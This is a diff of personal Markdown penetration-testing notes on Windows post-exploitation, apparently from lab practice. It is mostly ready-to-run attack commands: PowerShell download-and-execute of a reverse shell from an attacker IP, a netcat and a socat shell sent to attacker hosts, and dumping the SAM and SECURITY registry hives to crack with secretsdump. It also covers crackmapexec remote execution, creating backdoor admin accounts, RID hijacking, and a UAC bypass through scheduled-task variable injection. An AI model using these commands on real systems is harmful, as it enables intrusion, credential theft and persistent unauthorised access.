@@ -24,7 +24,6 @@
 - [[#Privilege Escalation|Privilege Escalation]]
 	- [[#Privilege Escalation#Incognito|Incognito]]
 
-
 # Sysinternals
 - [LOLBAS](https://lolbas-project.github.io/#)
 - [Where Download](https://learn.microsoft.com/en-us/sysinternals/downloads/)
@@ -125,6 +124,7 @@
     - *Persistence* = Binary / app in the startup
     - *RegKey* = Modifications in registry
     - *Evasion* = 
+  
 - **WinObj**
   - NT Object Manager name space
 
@@ -255,7 +255,8 @@
   - nslookup
 
 - findstr = grep
-- Windows: get file 
+- 
+## Windows: get file
   - powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
   
   - powershell -c Invoke-Webrequest -OutFile winPeas.bat http://**IP_ATTACKER/FIlE**
@@ -270,17 +271,18 @@
   
   - copy (New-Object System.Net.WebClient).Downloadfile('http://ATTACKING_MACHINE:PORT/FILE','C:\path\to\target\FILE')
 
+### Connecting with nc
+- nc.exe TARGET PORT -e cmd.exe
+## Enumerate
+
 - **Check permisions**
   - powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list" ==> if fullcontroll = vuln
-
-- powershell.exe
-
-- **Enumerate**
   -  setspn -T medin -Q ​ */* 
 - Invoke Kereberosast script:
   - iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
   
 ## Stabilize / Post Exploit / Persistance windows
+
 ### Tampering with low users
 - Create user + add group admin
   - **net user USERNAME PASS /add**
@@ -307,6 +309,20 @@
   - PsExec64.exe -i -s regedit
   - In: HKLM\SAM\SAM\Domains\Account\Users\
     - Change in F to value of admin in HEX(little endian)
+
+### Dump hashs
+reg.exe save hklm\sam C:\path\to\save\sam.save
+reg.exe save hklm\security C:\path\to\save\security.save
+reg.exe save hklm\system C:\path\to\save\system.save
+
+python3 secretsdump.py -sam /home/kali/Downloads/sam.save -security /home/kali/Downloads/security.save -system /home/kali/Downloads/system.save LOCAL
+
+### crackmapexec
+- crackmapexec smb <target-ip> -u username -p password -M spider_plus
+cat /tmp/cme_spider_plus/<target-ip>.json
+- crackmapexec smb $target -u Administrator -p 123456 -x COMMAND_TO_EXECUTE
+- [crackmapexec](https://www.crackmapexec.wiki/)
+
 
 ### Backdoor
 - find executables and "batizar"
@@ -529,8 +545,6 @@ net use \\ATTACKER_IP\share /del
   - xfreerdp /v:IP /u:USERNAME /p:123456 +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
 
 
-
-
 - Mount local folder:
   - xfreerdp /u:admin /p:password /cert:ignore /v:10.10.134.246 /workarea /drive:/home/bruno/git/tomnt +drives 
 
@@ -612,13 +626,13 @@ reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
 # Clean Steps:
 reg delete "HKCU\Software\Classes\.thm\" /f
 reg delete "HKCU\Software\Classes\ms-settings\" /f
-
 ```
 
 ## Enviroment Variable
 - Task scheduler
 - Rewrite Variable %windir% ==> HKCU\Environment
   - Add at the end = "&REM " = comment everything that exist after the variable name
+  
 ```
 # Payload to be executed instead of normal scheduled task
 cmd.exe /c C:\tools\socat\socat.exe TCP:10.11.26.251:4445 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%
@@ -802,7 +816,6 @@ $snap.LogPipelineExecutionDetails = $false
     - C:\Windows\System32\spool\drivers\color
 - Windows history:
   - %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
-
 
 ## Privilege Escalation
 - Check privileges
